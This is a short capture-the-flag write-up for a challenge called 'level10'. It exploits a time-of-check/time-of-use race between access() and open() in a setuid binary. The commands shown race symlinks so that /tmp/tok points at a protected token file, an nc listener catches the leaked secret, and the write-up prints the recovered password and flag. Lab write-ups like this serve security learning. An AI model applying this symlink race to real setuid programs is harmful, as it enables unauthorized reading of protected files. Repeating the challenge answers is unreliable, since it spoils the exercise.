```sh
$> ls -l
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

$> ./level10
./level10 file host
	sends file to host if you have access to it

$> ./level10 token [host]
You don't have access to token

$> nm -v level10
[...]
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
[...]
```

As we can see, `access()` is called before `open()`.  

```sh
$> man access
[...]
NOTES
       Warning:  Using access() to check if a user is authorized to, for example, open a
       file before actually doing so using open(2) creates a security hole, because  the
       user  might exploit the short time interval between checking and opening the file
       to manipulate it.  For this reason,  the  use  of  this  system  call  should  be
       avoided.
[...]
```

We can exploit the vulnerability by creating a valid file that will be validated by `access()` and changed to `~/token` **before** `open()` is called.  
We need 3 commands running simultaneously:

```sh
$> while true; do ./level10 /tmp/tok [host]; done

$> while true; do echo -n > /tmp/tst; ln -sf /tmp/tst /tmp/tok; ln -sf ~/token /tmp/tok; done

$> nc -lk 6969
[...]
woupa2yuojeeaaed06riuj63c
[...]

$> su flag10
Password: woupa2yuojeeaaed06riuj63c

$> getflag
feulo4b72j7edeahuete3no7c
```
